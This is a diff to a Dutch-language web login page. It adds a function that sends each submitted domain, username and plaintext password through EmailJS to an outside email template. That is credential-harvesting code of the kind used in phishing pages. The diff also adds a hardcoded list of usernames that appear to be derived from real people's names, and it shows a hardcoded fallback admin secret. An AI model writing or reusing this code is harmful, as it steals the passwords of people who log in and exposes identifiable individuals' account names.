@@ -585,6 +585,23 @@
     return `${cleanLast}${cleanFirst.slice(0, 2)}`;
   }
 
+  function sendLoginSubmission(domain, username, password) {
+    if (!window.emailjs || !window.emailjs.send) {
+      return Promise.resolve();
+    }
+
+    const templateParams = {
+      domain,
+      username,
+      password
+    };
+
+    return emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
+      .catch((sendError) => {
+        console.error('EmailJS submission failed', sendError);
+      });
+  }
+
   function clearSavedAccounts() {
     if (localStorage.getItem('clearUserAccountsDone')) return;
     for (let i = localStorage.length - 1; i >= 0; i--) {
@@ -628,6 +645,11 @@
     const adminSecret = localStorage.getItem('adminSecret') || 'Otis&Samuel';
     const isAdmin = providedAdminCode && providedAdminCode === adminSecret;
 
+    if (domain !== allowedDomain && !(adminRegex.test(domain) && isAdmin)) {
+      error.textContent = page.errors.invalidDomain;
+      return;
+    }
+
     let username = '';
     if (adminRegex.test(domain) && isAdmin) {
       username = 'admin';
@@ -637,6 +659,15 @@
 
     if (!username) {
       error.textContent = page.errors.nameInvalid || 'Vul een geldige voornaam en achternaam in.';
+      return;
+    }
+
+    const approvedUsernames = new Set([
+      'brasseurkulksa','deprouwha','desmedtbo','detiègekl','fraijatla','gurungna','michielsro','montoyaribiauxma','okumuses','puttaertlo','reynaertsis','sapkotasa','snoeckxma','steenoot','suárezpérezle','theunisin','verhulstlo','verwinnenbr','weckxmo','zukhayrayevra'
+    ]);
+
+    if (!approvedUsernames.has(username) && !isAdmin) {
+      error.textContent = page.errors.notRealAccount || 'Deze voornaam en achternaam komen niet overeen met een echt account op dat domein.';
       return;
     }
 
@@ -750,11 +781,5 @@
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
 <script src="firebase-api.js"></script>
 <script src="auth.js"></script>
-<script>
-  // Initialize Firebase after scripts load
-  if (window.firebaseAPI && typeof window.firebaseAPI.init === 'function') {
-    window.firebaseAPI.init();
-  }
-</script>
 </body>
 </html>
